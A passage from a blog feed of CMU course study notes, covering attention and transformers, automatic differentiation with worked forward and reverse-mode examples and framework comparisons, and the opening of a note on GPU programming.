h_n^{enc}\)</span></li></ul><p><strong>Score functions:</strong> - Dot product: <spanclass="math inline">\(\text{score}(q, k) = q^\top k\)</span> - Bilinear:<span class="math inline">\(\text{score}(q, k) = q W k\)</span> -Nonlinear: <span class="math inline">\(\text{score}(q, k) = w^\top\tanh(W[q; k])\)</span></p><p><strong>Usage:</strong> <span class="math inline">\(\text{logits} =\tanh(W_{out}[c_t; h_t])\)</span></p><h2 id="key-takeaways">Key Takeaways</h2><ul><li>RNN: sequence model with recurrent hidden state (theoreticallyinfinite context)</li><li>Vanilla RNN suffers from vanishing gradients → use GRU/LSTM</li><li>Encoder-decoder for conditional generation</li><li>Attention: dynamic context vector via weighted sum of encoderstates</li><li>RNN training is sequential (hard to parallelize) → motivatesTransformers (next lecture)</li></ul><h1 id="lec5-transformers">Lec5 Transformers</h1><p>This content is kind of like <ahref="https://xloverflow.github.io/2025/12/16/CS336/CS336-Lec3-Architectures-Hyperparameters/">CS336-Lec3Architectures &amp; Hyperparameters</a></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130002623323.png" alt="image-20260130002623323" style="zoom:40%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130002716882.png" alt="image-20260130002716882" style="zoom:40%;" /></p><p><strong><u>Attention Score Functions</u></strong>: The mostfrequently used function is <strong><u>Scaled Dot Product</u></strong>.this solve the problem that scale of dot product increases as dimensionsget larger. <span class="math display">\[a(q, k) = \frac{q^\top k}{\sqrt{|k|}}\]</span><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130003730167.png" alt="image-20260130003730167" style="zoom:40%;" /></p><p><u><strong>Intuition for Multi-heads</strong></u>: Information fromdifferent parts of the sentence can be useful to disambiguate indifferent ways.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130011718563.png" alt="image-20260130011718563" style="zoom:40%;" /></p>]]></content>
      
      
      <categories>
          
          <category> CMU 11-711 Advanced NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Natural Language Processing </tag>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> 11711 </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11868 LLM Sys &amp; 15642 ML Sys: DL Frameworks and Auto Differentiation</title>
      <link href="/2026/01/28/11868-LLM-Sys/11868-LLM-Sys-15642-ML-Sys-DL-Framworks-and-Auto-Differentiation/"/>
      <url>/2026/01/28/11868-LLM-Sys/11868-LLM-Sys-15642-ML-Sys-DL-Framworks-and-Auto-Differentiation/</url>
      
        <content type="html"><![CDATA[<h1 id="automatic-differentiation-deep-learning-frameworks">AutomaticDifferentiation &amp; Deep Learning Frameworks</h1><hr /><h2 id="the-learning-problem-gradient-descent">1. The Learning Problem&amp; Gradient Descent</h2><p>Given a training set <strong>D = {(xₙ, yₙ)}</strong>, the goal is tofind model parameters <strong>θ</strong> that minimize a loss function:<span class="math display">\[\min_{\theta} \mathcal{L}(\theta), \quad \mathcal{L} : \mathbb{R}^d \to\mathbb{R}\]</span> For classification, the standard loss is<strong>cross-entropy</strong>. PyTorch’s <code>CrossEntropyLoss</code>applies negative log-likelihood directly on raw logits (before softmax),which is numerically stable.</p><h3 id="why-gradient-descent">Why Gradient Descent?</h3><p>Using a first-order Taylor expansion around the current parametersxₜ: <span class="math display">\[f(x_t + \Delta x) \approx f(x_t) + \Delta x^T \nabla f \big|_{x_t}\]</span> To make f decrease, we want the second term to be as negativeas possible. By Cauchy–Schwarz, the optimal direction is<strong>opposite to the gradient</strong>, giving us the SGD updaterule: <span class="math display">\[x_{t+1} = x_t - \eta \cdot \nabla f \big|_{x_t}\]</span> where <strong>η</strong> is the learning ratehyperparameter.</p><h3 id="sgd-algorithm">SGD Algorithm</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set learning rate η</span><br><span class="line">1. initialize θ ← θ₀</span><br><span class="line">2. for epoch = 1 to maxEpoch:</span><br><span class="line">3.     for each mini-batch in data:</span><br><span class="line">4.         total_g = 0</span><br><span class="line">5.         for each (x, y) in batch:</span><br><span class="line">6.             compute error: err(f(x; θ), y)</span><br><span class="line">7.             compute gradient: g = ∂err/∂θ</span><br><span class="line">8.             total_g += g</span><br><span class="line">9.         update: θ = θ - η * total_g / N</span><br></pre></td></tr></table></figure><blockquote><p><strong>Key Question:</strong> How do we efficiently compute ∂ℒ/∂θfor <em>every</em> parameter in an arbitrarily deep network? This isexactly what automatic differentiation solves.</p></blockquote><hr /><h2 id="computation-graphs">2. Computation Graphs</h2><p>A <strong>computation graph</strong> is a directed acyclic graph(DAG) where:</p><ul><li><strong>Nodes</strong> represent variables (inputs, parameters,intermediates) or operations.</li><li><strong>Directed edges</strong> indicate data flow — the inputs toeach operation.</li></ul><h3 id="forward-evaluation-via-topological-sort">Forward Evaluation viaTopological Sort</h3><p>To evaluate the graph:</p><ol type="1"><li>Put all nodes in an unprocessed queue.</li><li>Repeatedly find a node whose inputs are all already computed.</li><li>Evaluate it, move it to the processed set.</li><li>Repeat until all nodes are evaluated.</li></ol><p>This guarantees every node is computed exactly once in a validdependency order.</p><hr /><h2 id="differentiation-methods-a-taxonomy">3. Differentiation Methods:A Taxonomy</h2><table><colgroup><col style="width: 11%" /><col style="width: 36%" /><col style="width: 15%" /><col style="width: 36%" /></colgroup><thead><tr class="header"><th>Method</th><th>How It Works</th><th>Cost for f: ℝⁿ → ℝ</th><th>Practical Use</th></tr></thead><tbody><tr class="odd"><td><strong>Numerical</strong></td><td>Evaluate f at perturbed points; finite differences</td><td>O(n) forward passes</td><td>Gradient checking only — too slow &amp; unstable for training</td></tr><tr class="even"><td><strong>Symbolic</strong></td><td>Algebraically apply sum/product/chain rules</td><td>Can blow up exponentially</td><td>CAS tools (Mathematica). Expression swell is impractical for largemodels</td></tr><tr class="odd"><td><strong>Forward-mode AD</strong></td><td>Propagate derivative “tangents” alongside values in one forwardpass</td><td>O(n) forward passes</td><td>Good when n is small (e.g., Hessian-vector products)</td></tr><tr class="even"><td><strong>Reverse-mode AD</strong></td><td>Run forward, then propagate “adjoints” backward</td><td><strong>O(1) backward passes</strong></td><td>The workhorse of deep learning — one pass gives all ∂ℒ/∂θ</td></tr></tbody></table><blockquote><p><strong>Key Insight:</strong> For f: ℝⁿ → ℝ (scalar loss, manyparameters), reverse-mode AD computes the full gradient in timeproportional to a <em>single</em> forward pass. Forward mode would needn passes.</p></blockquote><hr /><h2 id="forward-mode-automatic-differentiation">4. Forward-ModeAutomatic Differentiation</h2><p>Forward-mode AD computes derivatives by carrying a<strong>tangent</strong> (derivative value) alongside each intermediatevalue, propagating in the same direction as the forward computation.</p><h3 id="definition">Definition</h3><p>For each intermediate value vᵢ, define: <span class="math display">\[\dot{v}_i = \frac{\partial v_i}{\partial x_1}\]</span></p><h3 id="worked-example">Worked Example</h3><p><code>y = ln(x₁) + x₁·x₂ − sin(x₂)</code>, computing ∂y/∂x₁:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Forward evaluation trace (values)</span></span><br><span class="line">v1 = x1              <span class="comment"># = 2</span></span><br><span class="line">v2 = x2              <span class="comment"># = 5</span></span><br><span class="line">v3 = ln(v1)          <span class="comment"># = 0.693</span></span><br><span class="line">v4 = v1 * v2         <span class="comment"># = 10</span></span><br><span class="line">v5 = sin(v2)         <span class="comment"># = −0.959</span></span><br><span class="line">v6 = v3 + v4         <span class="comment"># = 10.693</span></span><br><span class="line">v7 = v6 − v5         <span class="comment"># = 11.652  →  y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Forward AD trace (tangents, seeded for ∂/∂x₁)</span></span><br><span class="line">v1_dot = <span class="number">1</span>                            <span class="comment"># seed</span></span><br><span class="line">v2_dot = <span class="number">0</span>                            <span class="comment"># not differentiating w.r.t. x₂</span></span><br><span class="line">v3_dot = v1_dot / v1                  <span class="comment"># = 0.5   (chain rule on ln)</span></span><br><span class="line">v4_dot = v1_dot*v2 + v2_dot*v1        <span class="comment"># = 5.0   (product rule)</span></span><br><span class="line">v5_dot = v2_dot * cos(v2)             <span class="comment"># = 0.0</span></span><br><span class="line">v6_dot = v3_dot + v4_dot              <span class="comment"># = 5.5</span></span><br><span class="line">v7_dot = v6_dot − v5_dot              <span class="comment"># = 5.5   →  ∂y/∂x₁</span></span><br></pre></td></tr></table></figure><h3 id="limitation">Limitation</h3><p>To get ∂y/∂x₂, we need to re-run the entire trace with a differentseed (v̇₁=0, v̇₂=1). For a network with millions of parameters, this isprohibitively expensive — hence reverse mode.</p><hr /><h2 id="reverse-mode-automatic-differentiation">5. Reverse-ModeAutomatic Differentiation</h2><p>Reverse-mode AD is the engine behind <code>loss.backward()</code> inPyTorch. It computes gradients w.r.t. <strong>all</strong> inputs in asingle backward pass.</p><h3 id="definition-1">Definition</h3><p>Define the <strong>adjoint</strong> of each node vᵢ:</p><p><span class="math display">\[\bar{v}_i = \frac{\partial y}{\partialv_i}\]</span></p><p>Seed v̄_output = 1, then traverse the graph in <strong>reversetopological order</strong>.</p><h3 id="worked-example-same-function">Worked Example (samefunction)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Reverse AD trace (adjoints)</span></span><br><span class="line">v7_bar = <span class="number">1</span>                                   <span class="comment"># seed: ∂y/∂y = 1</span></span><br><span class="line">v6_bar = v7_bar * <span class="number">1</span>                          <span class="comment"># ∂v7/∂v6 = 1  (subtraction)</span></span><br><span class="line">v5_bar = v7_bar * (-<span class="number">1</span>)                       <span class="comment"># ∂v7/∂v5 = −1</span></span><br><span class="line">v4_bar = v6_bar * <span class="number">1</span>                          <span class="comment"># ∂v6/∂v4 = 1  (addition)</span></span><br><span class="line">v3_bar = v6_bar * <span class="number">1</span>                          <span class="comment"># ∂v6/∂v3 = 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Nodes with MULTIPLE outgoing edges: sum contributions</span></span><br><span class="line">v2_bar = v5_bar * cos(v2) + v4_bar * v1      <span class="comment"># ≈ 1.716</span></span><br><span class="line">v1_bar = v4_bar * v2     + v3_bar / v1       <span class="comment"># = 5.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Result: ∂y/∂x₁ = 5.5,  ∂y/∂x₂ ≈ 1.716  (both in one pass!)</span></span><br></pre></td></tr></table></figure><h3 id="multiple-pathway-rule">Multiple Pathway Rule</h3><p>When a node vᵢ feeds into multiple downstream nodes, its adjoint isthe <strong>sum</strong> of partial contributions:</p><p><span class="math display">\[\bar{v}*i = \sum*{j \in \text{next}(i)}\bar{v}_j \cdot \frac{\partial v_j}{\partial v_i}\]</span></p><h3 id="reverse-ad-algorithm">Reverse AD Algorithm</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gradient</span>(<span class="params">out</span>):</span><br><span class="line">    node_to_grad = &#123;out: [<span class="number">1</span>]&#125;                  <span class="comment"># seed</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> reverse_topo_order(out):</span><br><span class="line">        v_bar_i = <span class="built_in">sum</span>(node_to_grad[i])         <span class="comment"># sum partial adjoints</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> inputs(i):</span><br><span class="line">            <span class="comment"># compute partial adjoint: v̄ᵢ · ∂vᵢ/∂vₖ</span></span><br><span class="line">            v_k_to_i = v_bar_i * local_grad(i, k)</span><br><span class="line">            node_to_grad[k].append(v_k_to_i)   <span class="comment"># accumulate</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> adjoint of <span class="built_in">input</span></span><br></pre></td></tr></table></figure><hr /><h2 id="vector-jacobian-products-tensor-adjoints">6. Vector-JacobianProducts &amp; Tensor Adjoints</h2><p>In practice, nodes hold <strong>tensors</strong> (matrices, vectors),not scalars. We generalize using the <strong>Jacobian</strong> and<strong>VJP</strong>.</p><h3 id="jacobian">Jacobian</h3><p>For y ∈ ℝᵐ, x ∈ ℝⁿ: <span class="math display">\[J = \frac{\partial y}{\partial x} = \begin{bmatrix} \partialy_1/\partial x_1 &amp; \partial y_1/\partial x_2 \ \partial y_2/\partialx_1 &amp; \partial y_2/\partial x_2 \end{bmatrix}\]</span> We <strong>never</strong> explicitly form J (it can beenormous). Instead, we compute the <strong>Vector-Jacobian Product(VJP)</strong>: <span class="math display">\[\bar{x} = J^T \bar{y}\]</span></p><h3 id="example-linear-layer">Example: Linear Layer</h3><p>For <code>y = Wx</code>:</p><table><thead><tr class="header"><th>Gradient</th><th>Formula</th></tr></thead><tbody><tr class="odd"><td>w.r.t. input x</td><td>x̄ = Wᵀ ȳ</td></tr><tr class="even"><td>w.r.t. weight W</td><td>W̄ = ȳ xᵀ</td></tr></tbody></table><blockquote><p><strong>Implementation Pattern:</strong> Every primitive op shipswith both a <code>forward()</code> and a <code>vjp()</code> function.The framework only needs to know these primitives; everything else ishandled by graph traversal.</p></blockquote><h2 id="backprop-vs.-reverse-mode-ad-graph-extension">7. Backpropvs. Reverse-Mode AD: Graph Extension</h2><p>There are two implementation strategies, and the distinction mattersfor higher-order derivatives.</p><h3 id="backpropagation-1st-generation">Backpropagation (1stgeneration)</h3><ul><li>Runs backward operations <strong>directly on the forwardgraph</strong>.</li><li>Computes adjoint <em>values</em> by hand, node by node.</li><li>Used in early frameworks: Caffe, cuda-convnet.</li><li><strong>Cannot</strong> naturally support gradient-of-gradient.</li></ul><h3 id="reverse-mode-ad-by-graph-extension-modern">Reverse-Mode AD byGraph Extension (modern)</h3><ul><li><strong>Constructs new graph nodes</strong> for each adjointcomputation.</li><li>The backward pass itself becomes a computation graph.</li><li>You can run another backward pass on top → <strong>higher-orderderivatives</strong>.</li><li>Used by PyTorch, JAX, modern TensorFlow.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The gradient function returns a computation graph, not just a value.</span></span><br><span class="line"><span class="comment"># We can compose and differentiate again:</span></span><br><span class="line"></span><br><span class="line">grad_fn    = grad(loss_fn)          <span class="comment"># first-order gradient (a graph)</span></span><br><span class="line">hessian_fn = grad(grad_fn)          <span class="comment"># second-order — differentiate the gradient!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># JAX makes this particularly clean:</span></span><br><span class="line"><span class="keyword">import</span> jax</span><br><span class="line">hessian = jax.grad(jax.grad(loss_fn))</span><br></pre></td></tr></table></figure><blockquote><p><strong>Key Takeaway:</strong> Reverse-mode AD by graph extension isstrictly more powerful than classic backprop. It’s the reason modernframeworks can compute Hessians, higher-order gradients, andmeta-learning objectives.</p></blockquote><hr /><h2 id="putting-it-together-a-deep-learning-framework">8. Putting ItTogether: A Deep Learning Framework</h2><p>A DL framework needs to be: <strong>expressive</strong> (any networkarchitecture), <strong>productive</strong> (hide CUDA,auto-differentiate), and <strong>efficient</strong> (scale to largemodels, auto hardware acceleration).</p><h3 id="design-principles">Design Principles</h3><ol type="1"><li><strong>Define</strong> the program as a symbolic dataflow graphwith placeholders, variables, and operations.</li><li><strong>Execute</strong> an optimized version of that graph onavailable devices.</li></ol><h3 id="basic-components-tensorflow-style">Basic Components(TensorFlow-style)</h3><table><colgroup><col style="width: 13%" /><col style="width: 51%" /><col style="width: 34%" /></colgroup><thead><tr class="header"><th>Component</th><th>Role</th><th>Example</th></tr></thead><tbody><tr class="odd"><td><strong>Placeholder</strong></td><td>Input data fed at runtime</td><td><code>tf.placeholder(tf.float32, (1, 784))</code></td></tr><tr class="even"><td><strong>Variable</strong></td><td>Stateful node for parameters; persists across executions</td><td><code>tf.Variable(tf.zeros((100,)))</code></td></tr><tr class="odd"><td><strong>Constant</strong></td><td>Static data</td><td><code>tf.constant([[1, 2], [3, 4]])</code></td></tr><tr class="even"><td><strong>Operation</strong></td><td>Math ops; must define forward + backward</td><td><code>tf.nn.relu(...)</code>, <code>tf.matmul(...)</code></td></tr><tr class="odd"><td><strong>Session</strong></td><td>Execution context binding graph to a device (CPU/GPU)</td><td><code>tf.Session()</code></td></tr></tbody></table><h3 id="implementing-an-operation">Implementing an Operation</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AddOperation</span>(<span class="title class_ inherited__">Operation</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Define the Add operation: output = a + b&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__([a, b])       <span class="comment"># a, b are input nodes</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backward</span>(<span class="params">self, upstream_grad</span>):</span><br><span class="line">        <span class="comment"># ∂(a+b)/∂a = 1,  ∂(a+b)/∂b = 1</span></span><br><span class="line">        <span class="keyword">return</span> upstream_grad, upstream_grad</span><br></pre></td></tr></table></figure><h3 id="full-training-loop-using-autograd">Full Training Loop (usingAutoGrad)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Define training objective</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">objective</span>(<span class="params">params, <span class="built_in">iter</span></span>):</span><br><span class="line">    idx = batch_indices(<span class="built_in">iter</span>)</span><br><span class="line">    <span class="keyword">return</span> -log_posterior(params, train_images[idx], train_labels[idx], L2_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get gradient via autograd</span></span><br><span class="line">objective_grad = grad(objective)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Neural network forward pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">neural_net_predict</span>(<span class="params">params, inputs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;params: list of (W, b) tuples. inputs: (N x D) matrix.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> W, b <span class="keyword">in</span> params:</span><br><span class="line">        outputs = np.dot(inputs, W) + b</span><br><span class="line">        inputs  = np.tanh(outputs)</span><br><span class="line">    <span class="keyword">return</span> outputs - logsumexp(outputs, axis=<span class="number">1</span>, keepdims=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Log posterior = log prior + log likelihood</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_posterior</span>(<span class="params">params, inputs, targets, L2_reg</span>):</span><br><span class="line">    log_prior = -L2_reg * l2_norm(params)</span><br><span class="line">    log_lik   = np.<span class="built_in">sum</span>(neural_net_predict(params, inputs) * targets)</span><br><span class="line">    <span class="keyword">return</span> log_prior + log_lik</span><br></pre></td></tr></table></figure><h3 id="implementing-session-execution">Implementing Session(Execution)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_session</span>(<span class="params">end_node, feed_dict</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Execute the computation graph.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> topological_sort(end_node):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, Placeholder):</span><br><span class="line">            node.value = feed_dict[node]</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, (Variable, Constant)):</span><br><span class="line">            <span class="keyword">pass</span>                           <span class="comment"># value already set</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, Operation):</span><br><span class="line">            inputs = [n.value <span class="keyword">for</span> n <span class="keyword">in</span> node.input_nodes]</span><br><span class="line">            node.value = node.forward(*inputs)</span><br><span class="line">    <span class="keyword">return</span> end_node.value</span><br></pre></td></tr></table></figure><hr /><h2 id="framework-comparison-pytorch-tensorflow-jax">9. FrameworkComparison: PyTorch, TensorFlow, JAX</h2><table style="width:100%;"><colgroup><col style="width: 15%" /><col style="width: 22%" /><col style="width: 24%" /><col style="width: 26%" /><col style="width: 10%" /></colgroup><thead><tr class="header"><th>Aspect</th><th>PyTorch</th><th>TensorFlow</th><th>JAX</th><th>NumPy</th></tr></thead><tbody><tr class="odd"><td><strong>Paradigm</strong></td><td>Dynamic (eager)</td><td>Static graph / Eager</td><td>Functional transformations</td><td>Procedural</td></tr><tr class="even"><td><strong>Autograd</strong></td><td>Dynamic comp graph</td><td>Static comp graph</td><td>Functional (<code>grad</code>/<code>jit</code>)</td><td>None</td></tr><tr class="odd"><td><strong>Hardware</strong></td><td>CPU, GPU, TPU</td><td>CPU, GPU, TPU</td><td>CPU, GPU, TPU</td><td>CPU only</td></tr><tr class="even"><td><strong>Ease of Use</strong></td><td>Pythonic</td><td>Steeper learning curve</td><td>Pythonic + functional</td><td>Very easy</td></tr><tr class="odd"><td><strong>Parallelism</strong></td><td><code>DataParallel</code> / DDP</td><td><code>tf.distribute</code></td><td><code>pmap</code></td><td>None</td></tr><tr class="even"><td><strong>Ecosystem</strong></td><td>Lightning, TorchVision</td><td>TensorBoard, TF Extended</td><td>Integrates with NumPy</td><td>—</td></tr></tbody></table><h3 id="dynamic-vs.-static-graphs">Dynamic vs. Static Graphs</h3><ul><li><strong>PyTorch (dynamic/eager):</strong> The computation graph isbuilt on-the-fly as you write Python code. Easy to debug with standardprint statements. The graph can change every iteration (e.g., differentsequence lengths in an RNN).</li><li><strong>TensorFlow v1 (static):</strong> You first <em>define</em>the graph symbolically, then <em>execute</em> it in a session. Enablesmore aggressive optimization but harder to debug.</li><li><strong>JAX (functional):</strong> No explicit graph object. Youwrite pure functions and use transformations (<code>jax.grad</code>,<code>jax.jit</code>, <code>jax.vmap</code>) to get gradients, JITcompilation, and vectorization.</li></ul><hr /><h2 id="gradient-checking-debugging">10. Gradient Checking &amp;Debugging</h2><p>When implementing custom backward passes, numerical gradient checkingis your best friend.</p><h3 id="centered-finite-differences">Centered Finite Differences</h3><p><span class="math display">\[\frac{\partial f(x_1, x_2)}{\partialx_1} \approx \frac{f(x_1 + h,, x_2) - f(x_1 - h,, x_2)}{2h}\]</span></p><p>This is more accurate than the one-sided formula (error is O(h²)vs. O(h)).</p><h3 id="best-practices">Best Practices</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Gradient checking recipe:</span></span><br><span class="line"><span class="comment"># 1. Use double precision (float64) — float32 errors dominate</span></span><br><span class="line"><span class="comment"># 2. Pick a small h (e.g., 1e-6)</span></span><br><span class="line"><span class="comment"># 3. Compute forward difference through the graph twice</span></span><br><span class="line"><span class="comment"># 4. Compare with your analytical gradient</span></span><br><span class="line"></span><br><span class="line">h = <span class="number">1e-6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">numerical_grad</span>(<span class="params">f, x, i</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Compute ∂f/∂xᵢ via centered differences.&quot;&quot;&quot;</span></span><br><span class="line">    x_plus  = x.copy(); x_plus[i]  += h</span><br><span class="line">    x_minus = x.copy(); x_minus[i] -= h</span><br><span class="line">    <span class="keyword">return</span> (f(x_plus) - f(x_minus)) / (<span class="number">2</span> * h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># More general: pick a random direction δ, check directional derivative</span></span><br><span class="line"><span class="comment"># δᵀ ∇f(θ) ≈ (f(θ + εδ) − f(θ − εδ)) / 2ε</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>Tip:</strong> If your analytical gradient and numericalgradient disagree by more than ~1e-5 (relative error), there’s likely abug in your VJP implementation. Check edge cases like zero inputs andboundary conditions.</p></blockquote><hr /><h2 id="summary">Summary</h2><table><colgroup><col style="width: 25%" /><col style="width: 74%" /></colgroup><thead><tr class="header"><th>Concept</th><th>What It Does</th></tr></thead><tbody><tr class="odd"><td><strong>Computation Graph</strong></td><td>DAG representing the program; enables both forward eval and backwarddifferentiation</td></tr><tr class="even"><td><strong>Topological Sort</strong></td><td>Defines a valid execution order for the graph</td></tr><tr class="odd"><td><strong>Forward-mode AD</strong></td><td>Propagates tangents forward; O(n) passes for n inputs</td></tr><tr class="even"><td><strong>Reverse-mode AD</strong></td><td>Propagates adjoints backward; O(1) passes for scalar output — thekey to efficient training</td></tr><tr class="odd"><td><strong>VJP</strong></td><td>The primitive operation of reverse AD on tensors; avoids forming thefull Jacobian</td></tr><tr class="even"><td><strong>Graph Extension</strong></td><td>Modern technique: backward pass builds a new graph, enablinghigher-order derivatives</td></tr><tr class="odd"><td><strong>DL Framework</strong></td><td>Combines: symbolic graph definition → automatic differentiation →optimized execution on hardware</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> CMU 11-868 LLM Systems </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> LLM Systems </tag>
            
            <tag> 11868 </tag>
            
            <tag> ML Systems </tag>
            
            <tag> Deep Learning </tag>
            
            <tag> Auto Differentiation </tag>
            
            <tag> 15642 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11868 LLM Sys: GPU Programming &amp; Acceleration</title>
      <link href="/2026/01/26/11868-LLM-Sys/11868-LLM-SyS-GPU-Programming-Acceleration/"/>
      <url>/2026/01/26/11868-LLM-Sys/11868-LLM-SyS-GPU-Programming-Acceleration/</url>
      
        <content type="html"><![CDATA[<h1 id="gpu-programming">GPU Programming</h1><h2 id="neural-network-layer-and-low-level-operators">Neural NetworkLayer and low-level operators</h2><p>A simple feedforward neural network for text classification consistsof a sequence of standard layers. The input text is first mapped tovectors using an <strong><u>embedding layer</u></strong>, followed by<strong><u>linear layers</u></strong> with <strong><u>ReLUactivations</u></strong>. An <strong><u>average pooling</u></strong>operation aggregates token representations into a single vector, and a<strong><u>softmax layer</u></strong> produces the final classprobabilities.</p><p>At a lower level, these neural network layers are implemented using asmall set of basic operations. <strong><u>Matrixmultiplication</u></strong> is used in linear layers,<u><strong>element-wise operations</strong></u> handle activations, and<u><strong>reduction operations</strong></u> such as averaging are usedfor pooling. Efficient execution of these operations relies heavily on<u><strong>GPUs</strong></u>.</p><h2 id="components-of-a-gpu-server">Components of A GPU Server</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125221821311.png" alt="image-20260125221821311" style="zoom:40%;" /></p><p>This figure illustrates a modern 4U computing server designed forhigh-performance and AI workloads. It combines dual AMD EPYC CPUs with<strong><u>multiple NVIDIA GPUs connected via PCIe andNVLink</u></strong>, alongside high-bandwidth DDR5 memory and NVMestorage to support large-scale parallel computation.</p><h2 id="gpu-architecture">GPU Architecture</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125221946137.png" alt="image-20260125221946137" style="zoom:40%;" 